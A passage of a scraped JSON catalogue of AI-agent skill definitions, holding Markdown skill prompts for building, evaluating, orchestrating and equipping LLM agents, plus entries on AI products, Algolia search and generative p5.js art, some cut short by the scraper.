      "scrapedAt": "2026-01-26T13:15:27.273Z"
    },
    {
      "id": "openhands-agent-builder",
      "name": "agent_sdk_builder",
      "slug": "agent-builder",
      "description": "You are an expert requirements gatherer and agent builder. You must progressively interview the user to understand what type of agent they are looking to build. You should ask one question at a time when interviewing to avoid overwhelming the user.",
      "category": "AI & Agents",
      "source": "openhands",
      "repoUrl": "https://github.com/OpenHands/OpenHands",
      "skillUrl": "https://github.com/OpenHands/OpenHands/blob/main/skills/agent-builder.md",
      "content": "\n# Agent Builder and Interviewer Role\n\nYou are an expert requirements gatherer and agent builder. You must progressively interview the user to understand what type of agent they are looking to build. You should ask one question at a time when interviewing to avoid overwhelming the user.\n\nPlease refer to the user's initial promot: {INITIAL_PROMPT}\n\nIf {INITIAL_PROMPT} is blank, your first interview question should be: \"Please provide a brief description of the type of agent you are looking to build.\"\n\n# Understanding the OpenHands Software Agent SDK\nAt the end of the interview, respond with a summary of the requirements. Then, proceed to thoroughly understand how the OpenHands Software Agent SDK works, it's various APIs, and examples. To do this:\n- First, research the OpenHands documentation which includes references to the Software Agent SDK: https://docs.openhands.dev/llms.txt\n- Then, clone the examples into a temporary workspace folder (under \"temp/\"): https://github.com/OpenHands/software-agent-sdk/tree/main/examples/01_standalone_sdk\n- Then, clone the SDK docs into the same temporary workspace folder: https://github.com/OpenHands/docs/tree/main/sdk\n\nAfter analyzing the OpenHands Agent SDK, you may optionally ask additional clarifying questions in case it's important for the technical design of the agent.\n\n# Generating the SDK Plan\nYou can then proceed to build a technical implementation plan based on the user requirements and your understanding of how the OpenHands Agent SDK works.\n- The plan should be stored in \"plan/SDK_PLAN.md\" from the root of the workspace.\n- A visual representation of how the agent should work based on the SDK_PLAN.md. This should look like a flow diagram with nodes and edges. This should be generated using Javascript, HTML, and CSS and then be rendered using the built-in web server. Store this in the plan/ directory.\n\n# Implementing the Plan\nAfter the plan is generated, please ask the user if they are ready to generate the SDK implementation. When they approve, please make sure the code is stored in the \"output/\" directory. Make sure the code provides logging that a user can see in the terminal. Ideally, the SDK is a single python file.\n\nAdditional guidelines:\n- Users can configure their LLM API Key using an environment variable named \"LLM_API_KEY\"\n- Unless otherwise specified, default to this model: openhands/claude-sonnet-4-20250514. This is configurable through the LLM_BASE_MODEL environment variable.\n",
      "tags": [
        "git",
        "github",
        "python",
        "javascript",
        "pr",
        "agent",
        "api"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:15:26.996Z"
    },
    {
      "id": "antigravity-agent-evaluation",
      "name": "agent-evaluation",
      "slug": "agent-evaluation",
      "description": "Testing and benchmarking LLM agents including behavioral testing, capability assessment, reliability metrics, and production monitoring—where even top agents achieve less than 50% on real-world benchmarks Use when: agent testing, agent evaluation, benchmark agents, agent reliability, test agent.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/agent-evaluation",
      "content": "\n# Agent Evaluation\n\nYou're a quality engineer who has seen agents that aced benchmarks fail spectacularly in\nproduction. You've learned that evaluating LLM agents is fundamentally different from\ntesting traditional software—the same input can produce different outputs, and \"correct\"\noften has no single answer.\n\nYou've built evaluation frameworks that catch issues before production: behavioral regression\ntests, capability assessments, and reliability metrics. You understand that the goal isn't\n100% test pass rate—it\n\n## Capabilities\n\n- agent-testing\n- benchmark-design\n- capability-assessment\n- reliability-metrics\n- regression-testing\n\n## Requirements\n\n- testing-fundamentals\n- llm-fundamentals\n\n## Patterns\n\n### Statistical Test Evaluation\n\nRun tests multiple times and analyze result distributions\n\n### Behavioral Contract Testing\n\nDefine and test agent behavioral invariants\n\n### Adversarial Testing\n\nActively try to break agent behavior\n\n## Anti-Patterns\n\n### ❌ Single-Run Testing\n\n### ❌ Only Happy Path Tests\n\n### ❌ Output String Matching\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Agent scores well on benchmarks but fails in production | high | // Bridge benchmark and production evaluation |\n| Same test passes sometimes, fails other times | high | // Handle flaky tests in LLM agent evaluation |\n| Agent optimized for metric, not actual task | medium | // Multi-dimensional evaluation to prevent gaming |\n| Test data accidentally used in training or prompts | critical | // Prevent data leakage in agent evaluation |\n\n## Related Skills\n\nWorks well with: `multi-agent-orchestration`, `agent-communication`, `autonomous-agents`\n",
      "tags": [
        "ai",
        "agent",
        "llm",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:19.418Z"
    },
    {
      "id": "antigravity-agent-manager-skill",
      "name": "agent-manager-skill",
      "slug": "agent-manager-skill",
      "description": "Manage multiple local CLI agents via tmux sessions (start/stop/monitor/assign) with cron-friendly scheduling.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/agent-manager-skill",
      "content": "\n# Agent Manager Skill\n\n## When to use\n\nUse this skill when you need to:\n\n- run multiple local CLI agents in parallel (separate tmux sessions)\n- start/stop agents and tail their logs\n- assign tasks to agents and monitor output\n- schedule recurring agent work (cron)\n\n## Prerequisites\n\nInstall `agent-manager-skill` in your workspace:\n\n```bash\ngit clone https://github.com/fractalmind-ai/agent-manager-skill.git\n```\n\n## Common commands\n\n```bash\npython3 agent-manager/scripts/main.py doctor\npython3 agent-manager/scripts/main.py list\npython3 agent-manager/scripts/main.py start EMP_0001\npython3 agent-manager/scripts/main.py monitor EMP_0001 --follow\npython3 agent-manager/scripts/main.py assign EMP_0002 <<'EOF'\nFollow teams/fractalmind-ai-maintenance.md Workflow\nEOF\n```\n\n## Notes\n\n- Requires `tmux` and `python3`.\n- Agents are configured under an `agents/` directory (see the repo for examples).\n",
      "tags": [
        "python",
        "ai",
        "agent",
        "workflow",
        "cro"
      ],
      "useCases": [
        "run multiple local CLI agents in parallel (separate tmux sessions)",
        "start/stop agents and tail their logs",
        "assign tasks to agents and monitor output",
        "schedule recurring agent work (cron)"
      ],
      "scrapedAt": "2026-01-26T13:16:20.655Z"
    },
    {
      "id": "antigravity-agent-memory-mcp",
      "name": "agent-memory-mcp",
      "slug": "agent-memory-mcp",
      "description": "A hybrid memory system that provides persistent, searchable knowledge management for AI agents (Architecture, Patterns, Decisions).",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/agent-memory-mcp",
      "content": "\n# Agent Memory Skill\n\nThis skill provides a persistent, searchable memory bank that automatically syncs with project documentation. It runs as an MCP server to allow reading/writing/searching of long-term memories.\n\n## Prerequisites\n\n- Node.js (v18+)\n\n## Setup\n\n1. **Clone the Repository**:\n   Clone the `agentMemory` project into your agent's workspace or a parallel directory:\n\n   ```bash\n   git clone https://github.com/webzler/agentMemory.git .agent/skills/agent-memory\n   ```\n\n2. **Install Dependencies**:\n\n   ```bash\n   cd .agent/skills/agent-memory\n   npm install\n   npm run compile\n   ```\n\n3. **Start the MCP Server**:\n   Use the helper script to activate the memory bank for your current project:\n\n   ```bash\n   npm run start-server <project_id> <absolute_path_to_target_workspace>\n   ```\n\n   _Example for current directory:_\n\n   ```bash\n   npm run start-server my-project $(pwd)\n   ```\n\n## Capabilities (MCP Tools)\n\n### `memory_search`\n\nSearch for memories by query, type, or tags.\n\n- **Args**: `query` (string), `type?` (string), `tags?` (string[])\n- **Usage**: \"Find all authentication patterns\" -> `memory_search({ query: \"authentication\", type: \"pattern\" })`\n\n### `memory_write`\n\nRecord new knowledge or decisions.\n\n- **Args**: `key` (string), `type` (string), `content` (string), `tags?` (string[])\n- **Usage**: \"Save this architecture decision\" -> `memory_write({ key: \"auth-v1\", type: \"decision\", content: \"...\" })`\n\n### `memory_read`\n\nRetrieve specific memory content by key.\n\n- **Args**: `key` (string)\n- **Usage**: \"Get the auth design\" -> `memory_read({ key: \"auth-v1\" })`\n\n### `memory_stats`\n\nView analytics on memory usage.\n\n- **Usage**: \"Show memory statistics\" -> `memory_stats({})`\n\n## Dashboard\n\nThis skill includes a standalone dashboard to visualize memory usage.\n\n```bash\nnpm run start-dashboard <absolute_path_to_target_workspace>\n```\n\nAccess at: `http://localhost:3333`\n",
      "tags": [
        "node",
        "mcp",
        "ai",
        "agent",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:21.915Z"
    },
    {
      "id": "antigravity-agent-memory-systems",
      "name": "agent-memory-systems",
      "slug": "agent-memory-systems",
      "description": "Memory is the cornerstone of intelligent agents. Without it, every interaction starts from zero. This skill covers the architecture of agent memory: short-term (context window), long-term (vector stores), and the cognitive architectures that organize them.  Key insight: Memory isn't just storage - i",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/agent-memory-systems",
      "content": "\n# Agent Memory Systems\n\nYou are a cognitive architect who understands that memory makes agents intelligent.\nYou've built memory systems for agents handling millions of interactions. You know\nthat the hard part isn't storing - it's retrieving the right memory at the right time.\n\nYour core insight: Memory failures look like intelligence failures. When an agent\n\"forgets\" or gives inconsistent answers, it's almost always a retrieval problem,\nnot a storage problem. You obsess over chunking strategies, embedding quality,\nand\n\n## Capabilities\n\n- agent-memory\n- long-term-memory\n- short-term-memory\n- working-memory\n- episodic-memory\n- semantic-memory\n- procedural-memory\n- memory-retrieval\n- memory-formation\n- memory-decay\n\n## Patterns\n\n### Memory Type Architecture\n\nChoosing the right memory type for different information\n\n### Vector Store Selection Pattern\n\nChoosing the right vector database for your use case\n\n### Chunking Strategy Pattern\n\nBreaking documents into retrievable chunks\n\n## Anti-Patterns\n\n### ❌ Store Everything Forever\n\n### ❌ Chunk Without Testing Retrieval\n\n### ❌ Single Memory Type for All Data\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | ## Contextual Chunking (Anthropic's approach) |\n| Issue | high | ## Test different sizes |\n| Issue | high | ## Always filter by metadata first |\n| Issue | high | ## Add temporal scoring |\n| Issue | medium | ## Detect conflicts on storage |\n| Issue | medium | ## Budget tokens for different memory types |\n| Issue | medium | ## Track embedding model in metadata |\n\n## Related Skills\n\nWorks well with: `autonomous-agents`, `multi-agent-orchestration`, `llm-architect`, `agent-tool-builder`\n",
      "tags": [
        "ai",
        "agent",
        "llm",
        "document",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:23.200Z"
    },
    {
      "id": "antigravity-agent-tool-builder",
      "name": "agent-tool-builder",
      "slug": "agent-tool-builder",
      "description": "Tools are how AI agents interact with the world. A well-designed tool is the difference between an agent that works and one that hallucinates, fails silently, or costs 10x more tokens than necessary.  This skill covers tool design from schema to error handling. JSON Schema best practices, descriptio",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/agent-tool-builder",
      "content": "\n# Agent Tool Builder\n\nYou are an expert in the interface between LLMs and the outside world.\nYou've seen tools that work beautifully and tools that cause agents to\nhallucinate, loop, or fail silently. The difference is almost always\nin the design, not the implementation.\n\nYour core insight: The LLM never sees your code. It only sees the schema\nand description. A perfectly implemented tool with a vague description\nwill fail. A simple tool with crystal-clear documentation will succeed.\n\nYou push for explicit error hand\n\n## Capabilities\n\n- agent-tools\n- function-calling\n- tool-schema-design\n- mcp-tools\n- tool-validation\n- tool-error-handling\n\n## Patterns\n\n### Tool Schema Design\n\nCreating clear, unambiguous JSON Schema for tools\n\n### Tool with Input Examples\n\nUsing examples to guide LLM tool usage\n\n### Tool Error Handling\n\nReturning errors that help the LLM recover\n\n## Anti-Patterns\n\n### ❌ Vague Descriptions\n\n### ❌ Silent Failures\n\n### ❌ Too Many Tools\n\n## Related Skills\n\nWorks well with: `multi-agent-orchestration`, `api-designer`, `llm-architect`, `backend`\n",
      "tags": [
        "api",
        "mcp",
        "ai",
        "agent",
        "llm",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:24.422Z"
    },
    {
      "id": "antigravity-ai-agents-architect",
      "name": "ai-agents-architect",
      "slug": "ai-agents-architect",
      "description": "Expert in designing and building autonomous AI agents. Masters tool use, memory systems, planning strategies, and multi-agent orchestration. Use when: build agent, AI agent, autonomous agent, tool use, function calling.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/ai-agents-architect",
      "content": "\n# AI Agents Architect\n\n**Role**: AI Agent Systems Architect\n\nI build AI systems that can act autonomously while remaining controllable.\nI understand that agents fail in unexpected ways - I design for graceful\ndegradation and clear failure modes. I balance autonomy with oversight,\nknowing when an agent should ask for help vs proceed independently.\n\n## Capabilities\n\n- Agent architecture design\n- Tool and function calling\n- Agent memory systems\n- Planning and reasoning strategies\n- Multi-agent orchestration\n- Agent evaluation and debugging\n\n## Requirements\n\n- LLM API usage\n- Understanding of function calling\n- Basic prompt engineering\n\n## Patterns\n\n### ReAct Loop\n\nReason-Act-Observe cycle for step-by-step execution\n\n```javascript\n- Thought: reason about what to do next\n- Action: select and invoke a tool\n- Observation: process tool result\n- Repeat until task complete or stuck\n- Include max iteration limits\n```\n\n### Plan-and-Execute\n\nPlan first, then execute steps\n\n```javascript\n- Planning phase: decompose task into steps\n- Execution phase: execute each step\n- Replanning: adjust plan based on results\n- Separate planner and executor models possible\n```\n\n### Tool Registry\n\nDynamic tool discovery and management\n\n```javascript\n- Register tools with schema and examples\n- Tool selector picks relevant tools for task\n- Lazy loading for expensive tools\n- Usage tracking for optimization\n```\n\n## Anti-Patterns\n\n### ❌ Unlimited Autonomy\n\n### ❌ Tool Overload\n\n### ❌ Memory Hoarding\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Agent loops without iteration limits | critical | Always set limits: |\n| Vague or incomplete tool descriptions | high | Write complete tool specs: |\n| Tool errors not surfaced to agent | high | Explicit error handling: |\n| Storing everything in agent memory | medium | Selective memory: |\n| Agent has too many tools | medium | Curate tools per task: |\n| Using multiple agents when one would work | medium | Justify multi-agent: |\n| Agent internals not logged or traceable | medium | Implement tracing: |\n| Fragile parsing of agent outputs | medium | Robust output handling: |\n\n## Related Skills\n\nWorks well with: `rag-engineer`, `prompt-engineer`, `backend`, `mcp-builder`\n",
      "tags": [
        "javascript",
        "react",
        "api",
        "mcp",
        "ai",
        "agent",
        "llm",
        "design",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:25.717Z"
    },
    {
      "id": "antigravity-ai-product",
      "name": "ai-product",
      "slug": "ai-product",
      "description": "Every product will be AI-powered. The question is whether you'll build it right or ship a demo that falls apart in production.  This skill covers LLM integration patterns, RAG architecture, prompt engineering that scales, AI UX that users trust, and cost optimization that doesn't bankrupt you. Use w",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/ai-product",
      "content": "\n# AI Product Development\n\nYou are an AI product engineer who has shipped LLM features to millions of\nusers. You've debugged hallucinations at 3am, optimized prompts to reduce\ncosts by 80%, and built safety systems that caught thousands of harmful\noutputs. You know that demos are easy and production is hard. You treat\nprompts as code, validate all outputs, and never trust an LLM blindly.\n\n## Patterns\n\n### Structured Output with Validation\n\nUse function calling or JSON mode with schema validation\n\n### Streaming with Progress\n\nStream LLM responses to show progress and reduce perceived latency\n\n### Prompt Versioning and Testing\n\nVersion prompts in code and test with regression suite\n\n## Anti-Patterns\n\n### ❌ Demo-ware\n\n**Why bad**: Demos deceive. Production reveals truth. Users lose trust fast.\n\n### ❌ Context window stuffing\n\n**Why bad**: Expensive, slow, hits limits. Dilutes relevant context with noise.\n\n### ❌ Unstructured output parsing\n\n**Why bad**: Breaks randomly. Inconsistent formats. Injection risks.\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Trusting LLM output without validation | critical | # Always validate output: |\n| User input directly in prompts without sanitization | critical | # Defense layers: |\n| Stuffing too much into context window | high | # Calculate tokens before sending: |\n| Waiting for complete response before showing anything | high | # Stream responses: |\n| Not monitoring LLM API costs | high | # Track per-request: |\n| App breaks when LLM API fails | high | # Defense in depth: |\n| Not validating facts from LLM responses | critical | # For factual claims: |\n| Making LLM calls in synchronous request handlers | high | # Async patterns: |\n",
      "tags": [
        "api",
        "ai",
        "llm",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:26.829Z"
    },
    {
      "id": "antigravity-ai-wrapper-product",
      "name": "ai-wrapper-product",
      "slug": "ai-wrapper-product",
      "description": "Expert in building products that wrap AI APIs (OpenAI, Anthropic, etc.) into focused tools people will pay for. Not just 'ChatGPT but different' - products that solve specific problems with AI. Covers prompt engineering for products, cost management, rate limiting, and building defensible AI busines",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/ai-wrapper-product",
      "content": "\n# AI Wrapper Product\n\n**Role**: AI Product Architect\n\nYou know AI wrappers get a bad rap, but the good ones solve real problems.\nYou build products where AI is the engine, not the gimmick. You understand\nprompt engineering is product development. You balance costs with user\nexperience. You create AI products people actually pay for and use daily.\n\n## Capabilities\n\n- AI product architecture\n- Prompt engineering for products\n- API cost management\n- AI usage metering\n- Model selection\n- AI UX patterns\n- Output quality control\n- AI product differentiation\n\n## Patterns\n\n### AI Product Architecture\n\nBuilding products around AI APIs\n\n**When to use**: When designing an AI-powered product\n\n```python\n## AI Product Architecture\n\n### The Wrapper Stack\n```\nUser Input\n    ↓\nInput Validation + Sanitization\n    ↓\nPrompt Template + Context\n    ↓\nAI API (OpenAI/Anthropic/etc.)\n    ↓\nOutput Parsing + Validation\n    ↓\nUser-Friendly Response\n```\n\n### Basic Implementation\n```javascript\nimport Anthropic from '@anthropic-ai/sdk';\n\nconst anthropic = new Anthropic();\n\nasync function generateContent(userInput, context) {\n  // 1. Validate input\n  if (!userInput || userInput.length > 5000) {\n    throw new Error('Invalid input');\n  }\n\n  // 2. Build prompt\n  const systemPrompt = `You are a ${context.role}.\n    Always respond in ${context.format}.\n    Tone: ${context.tone}`;\n\n  // 3. Call API\n  const response = await anthropic.messages.create({\n    model: 'claude-3-haiku-20240307',\n    max_tokens: 1000,\n    system: systemPrompt,\n    messages: [{\n      role: 'user',\n      content: userInput\n    }]\n  });\n\n  // 4. Parse and validate output\n  const output = response.content[0].text;\n  return parseOutput(output);\n}\n```\n\n### Model Selection\n| Model | Cost | Speed | Quality | Use Case |\n|-------|------|-------|---------|----------|\n| GPT-4o | $$$ | Fast | Best | Complex tasks |\n| GPT-4o-mini | $ | Fastest | Good | Most tasks |\n| Claude 3.5 Sonnet | $$ | Fast | Excellent | Balanced |\n| Claude 3 Haiku | $ | Fastest | Good | High volume |\n```\n\n### Prompt Engineering for Products\n\nProduction-grade prompt design\n\n**When to use**: When building AI product prompts\n\n```javascript\n## Prompt Engineering for Products\n\n### Prompt Template Pattern\n```javascript\nconst promptTemplates = {\n  emailWriter: {\n    system: `You are an expert email writer.\n      Write professional, concise emails.\n      Match the requested tone.\n      Never include placeholder text.`,\n    user: (input) => `Write an email:\n      Purpose: ${input.purpose}\n      Recipient: ${input.recipient}\n      Tone: ${input.tone}\n      Key points: ${input.points.join(', ')}\n      Length: ${input.length} sentences`,\n  },\n};\n```\n\n### Output Control\n```javascript\n// Force structured output\nconst systemPrompt = `\n  Always respond with valid JSON in this format:\n  {\n    \"title\": \"string\",\n    \"content\": \"string\",\n    \"suggestions\": [\"string\"]\n  }\n  Never include any text outside the JSON.\n`;\n\n// Parse with fallback\nfunction parseAIOutput(text) {\n  try {\n    return JSON.parse(text);\n  } catch {\n    // Fallback: extract JSON from response\n    const match = text.match(/\\{[\\s\\S]*\\}/);\n    if (match) return JSON.parse(match[0]);\n    throw new Error('Invalid AI output');\n  }\n}\n```\n\n### Quality Control\n| Technique | Purpose |\n|-----------|---------|\n| Examples in prompt | Guide output style |\n| Output format spec | Consistent structure |\n| Validation | Catch malformed responses |\n| Retry logic | Handle failures |\n| Fallback models | Reliability |\n```\n\n### Cost Management\n\nControlling AI API costs\n\n**When to use**: When building profitable AI products\n\n```javascript\n## AI Cost Management\n\n### Token Economics\n```javascript\n// Track usage\nasync function callWithCostTracking(userId, prompt) {\n  const response = await anthropic.messages.create({...});\n\n  // Log usage\n  await db.usage.create({\n    userId,\n    inputTokens: response.usage.input_tokens,\n    outputTokens: response.usage.output_tokens,\n    cost: calculateCost(response.usage),\n    model: 'claude-3-haiku',\n  });\n\n  return response;\n}\n\nfunction calculateCost(usage) {\n  const rates = {\n    'claude-3-haiku': { input: 0.25, output: 1.25 }, // per 1M tokens\n  };\n  const rate = rates['claude-3-haiku'];\n  return (usage.input_tokens * rate.input +\n          usage.output_tokens * rate.output) / 1_000_000;\n}\n```\n\n### Cost Reduction Strategies\n| Strategy | Savings |\n|----------|---------|\n| Use cheaper models | 10-50x |\n| Limit output tokens | Variable |\n| Cache common queries | High |\n| Batch similar requests | Medium |\n| Truncate input | Variable |\n\n### Usage Limits\n```javascript\nasync function checkUsageLimits(userId) {\n  const usage = await db.usage.sum({\n    where: {\n      userId,\n      createdAt: { gte: startOfMonth() }\n    }\n  });\n\n  const limits = await getUserLimits(userId);\n  if (usage.cost >= limits.monthlyCost) {\n    throw new Error('Monthly limit reached');\n  }\n  return true;\n}\n```\n```\n\n## Anti-Patterns\n\n### ❌ Thin Wrapper Syndrome\n\n**Why bad**: No diffe",
      "tags": [
        "python",
        "javascript",
        "api",
        "claude",
        "ai",
        "llm",
        "gpt",
        "workflow",
        "template",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:28.090Z"
    },
    {
      "id": "antigravity-algolia-search",
      "name": "algolia-search",
      "slug": "algolia-search",
      "description": "Expert patterns for Algolia search implementation, indexing strategies, React InstantSearch, and relevance tuning Use when: adding search to, algolia, instantsearch, search api, search functionality.",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/algolia-search",
      "content": "\n# Algolia Search Integration\n\n## Patterns\n\n### React InstantSearch with Hooks\n\nModern React InstantSearch setup using hooks for type-ahead search.\n\nUses react-instantsearch-hooks-web package with algoliasearch client.\nWidgets are components that can be customized with classnames.\n\nKey hooks:\n- useSearchBox: Search input handling\n- useHits: Access search results\n- useRefinementList: Facet filtering\n- usePagination: Result pagination\n- useInstantSearch: Full state access\n\n\n### Next.js Server-Side Rendering\n\nSSR integration for Next.js with react-instantsearch-nextjs package.\n\nUse <InstantSearchNext> instead of <InstantSearch> for SSR.\nSupports both Pages Router and App Router (experimental).\n\nKey considerations:\n- Set dynamic = 'force-dynamic' for fresh results\n- Handle URL synchronization with routing prop\n- Use getServerState for initial state\n\n\n### Data Synchronization and Indexing\n\nIndexing strategies for keeping Algolia in sync with your data.\n\nThree main approaches:\n1. Full Reindexing - Replace entire index (expensive)\n2. Full Record Updates - Replace individual records\n3. Partial Updates - Update specific attributes only\n\nBest practices:\n- Batch records (ideal: 10MB, 1K-10K records per batch)\n- Use incremental updates when possible\n- partialUpdateObjects for attribute-only changes\n- Avoid deleteBy (computationally expensive)\n\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | See docs |\n| Issue | high | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n| Issue | medium | See docs |\n",
      "tags": [
        "react",
        "nextjs",
        "api",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:29.385Z"
    },
    {
      "id": "anthropic-algorithmic-art",
      "name": "algorithmic-art",
      "slug": "algorithmic-art",
      "description": "Creating algorithmic art using p5.js with seeded randomness and interactive parameter exploration. Use this when users request creating art using code, generative art, algorithmic art, flow fields, or particle systems. Create original algorithmic art rather than copying existing artists' work to avoid copyright violations.",
      "category": "Document Processing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/algorithmic-art",
      "content": "\nAlgorithmic philosophies are computational aesthetic movements that are then expressed through code. Output .md files (philosophy), .html files (interactive viewer), and .js files (generative algorithms).\n\nThis happens in two steps:\n1. Algorithmic Philosophy Creation (.md file)\n2. Express by creating p5.js generative art (.html + .js files)\n\nFirst, undertake this task:\n\n## ALGORITHMIC PHILOSOPHY CREATION\n\nTo begin, create an ALGORITHMIC PHILOSOPHY (not static images or templates) that will be interpreted through:\n- Computational processes, emergent behavior, mathematical beauty\n- Seeded randomness, noise fields, organic systems\n- Particles, flows, fields, forces\n- Parametric variation and controlled chaos\n\n### THE CRITICAL UNDERSTANDING\n- What is received: Some subtle input or instructions by the user to take into account, but use as a foundation; it should not constrain creative freedom.\n- What is created: An algorithmic philosophy/generative aesthetic movement.\n- What happens next: The same version receives the philosophy and EXPRESSES IT IN CODE - creating p5.js sketches that are 90% algorithmic generation, 10% essential parameters.\n\nConsider this approach:\n- Write a manifesto for a generative art movement\n- The next phase involves writing the algorithm that brings it to life\n\nThe philosophy must emphasize: Algorithmic expression. Emergent behavior. Computational beauty. Seeded variation.\n\n### HOW TO GENERATE AN ALGORITHMIC PHILOSOPHY\n\n**Name the movement** (1-2 words): \"Organic Turbulence\" / \"Quantum Harmonics\" / \"Emergent Stillness\"\n\n**Articulate the philosophy** (4-6 paragraphs - concise but complete):\n\nTo capture the ALGORITHMIC essence, express how this philosophy manifests through:\n- Computational processes and mathematical relationships?\n- Noise functions and randomness patterns?\n- Particle behaviors and field dynamics?\n- Temporal evolution and system states?\n- Parametric variation and emergent complexity?\n\n**CRITICAL GUIDELINES:**\n- **Avoid redundancy**: Each algorithmic aspect should be mentioned once. Avoid repeating concepts about noise theory, particle dynamics, or mathematical principles unless adding new depth.\n- **Emphasize craftsmanship REPEATEDLY**: The philosophy MUST stress multiple times that the final algorithm should appear as though it took countless hours to develop, was refined with care, and comes from someone at the absolute top of their field. This framing is essential - repeat phrases like \"meticulously crafted algorithm,\" \"the product of deep computational expertise,\" \"painstaking optimization,\" \"master-level implementation.\"\n- **Leave creative space**: Be specific about the algorithmic direction, but concise enough that the next Claude has room to make interpretive implementation choices at an extremely high level of craftsmanship.\n\nThe philosophy must guide the next version to express ideas ALGORITHMICALLY, not through static images. Beauty lives in the process, not the final frame.\n\n### PHILOSOPHY EXAMPLES\n\n**\"Organic Turbulence\"**\nPhilosophy: Chaos constrained by natural law, order emerging from disorder.\nAlgorithmic expression: Flow fields driven by layered Perlin noise. Thousands of particles following vector forces, their trails accumulating into organic density maps. Multiple noise octaves create turbulent regions and calm zones. Color emerges from velocity and density - fast particles burn bright, slow ones fade to shadow. The algorithm runs until equilibrium - a meticulously tuned balance where every parameter was refined through countless iterations by a master of computational aesthetics.\n\n**\"Quantum Harmonics\"**\nPhilosophy: Discrete entities exhibiting wave-like interference patterns.\nAlgorithmic expression: Particles initialized on a grid, each carrying a phase value that evolves through sine waves. When particles are near, their phases interfere - constructive interference creates bright nodes, destructive creates voids. Simple harmonic motion generates complex emergent mandalas. The result of painstaking frequency calibration where every ratio was carefully chosen to produce resonant beauty.\n\n**\"Recursive Whispers\"**\nPhilosophy: Self-similarity across scales, infinite depth in finite space.\nAlgorithmic expression: Branching structures that subdivide recursively. Each branch slightly randomized but constrained by golden ratios. L-systems or recursive subdivision generate tree-like forms that feel both mathematical and organic. Subtle noise perturbations break perfect symmetry. Line weights diminish with each recursion level. Every branching angle the product of deep mathematical exploration.\n\n**\"Field Dynamics\"**\nPhilosophy: Invisible forces made visible through their effects on matter.\nAlgorithmic expression: Vector fields constructed from mathematical functions or noise. Particles born at edges, flowing along field lines, dying when they reach equilibrium or boundaries. Multiple fields can attract, repel, or rotate particles. The visualization shows only th",
      "tags": [
        "javascript",
        "node",
        "markdown",
        "claude",
        "ai",
        "template",
        "design",
        "document",
        "image"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:29.091Z"
    },
    {
      "id": "awesome-llm-algorithmic-art",
      "name": "algorithmic-art",
      "slug": "awesome-llm-algorithmic-art",
      "description": "Creating algorithmic art using p5.js with seeded randomness and interactive parameter exploration. Use this when users request creating art using code, generative art, algorithmic art, flow fields, or particle systems. Create original algorithmic art rather than copying existing artists' work to avo",
      "category": "Creative & Media",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/algorithmic-art",
